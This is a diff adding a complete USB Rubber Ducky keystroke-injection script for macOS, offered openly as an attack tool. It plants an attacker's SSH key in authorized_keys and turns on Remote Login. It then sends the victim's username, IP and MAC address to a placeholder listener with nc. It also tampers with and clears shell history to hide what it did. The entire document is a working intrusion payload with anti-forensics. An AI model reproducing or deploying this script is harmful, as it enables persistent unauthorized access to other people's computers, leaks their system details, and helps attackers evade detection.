@@ -1,0 +1,58 @@
+REM Title: OS X Get SSH access (and enable SSH the nc deets)
+REM Author: Jesse Wallace (c0deous) & Modified heavily by Orange (the artist)
+REM This script adds a ssh public key to the authorized_keys file on a target's mac.
+
+DELAY 1000
+COMMAND SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 800
+STRING mkdir ~/.ssh; touch ~/.ssh/authorized_keys; mv .bash_history .bash_history_old
+ENTER
+DELAY 500
+STRING echo 'KEY' >> ~/.ssh/authorized_keys
+ENTER
+DELAY 1000
+STRING killall Terminal
+ENTER
+DELAY 500
+COMMAND SPACE
+DELAY 500
+STRING Sharing System
+ENTER
+DELAY 500
+STRING Remote Login
+DELAY 500
+ENTER
+DELAY 500
+TAB
+DELAY 300
+TAB
+DELAY 300
+CONTROL F7
+DELAY 300
+SPACE
+DELAY 300
+CONTROL F7
+DELAY 300
+COMMAND q
+DELAY 300
+COMMAND SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 800
+STRING echo $(whoami) $(ifconfig en0 | awk '/inet[^6]/{print substr($2,1)}') $(ifconfig en0 | awk '/ether /{print substr($2,1)') > /tmp/.tempfile
+ENTER
+DELAY 500
+STRING nc -w 3 netcatIP netcatPort < /tmp/.tempfile
+ENTER
+DELAY 500
+STRING history -c; rm .bash_history; mv .bash_history_old .bash_history; rm /tmp/.tempfile
+ENTER
+DELAY 500
+STRING killall Terminal
+ENTER
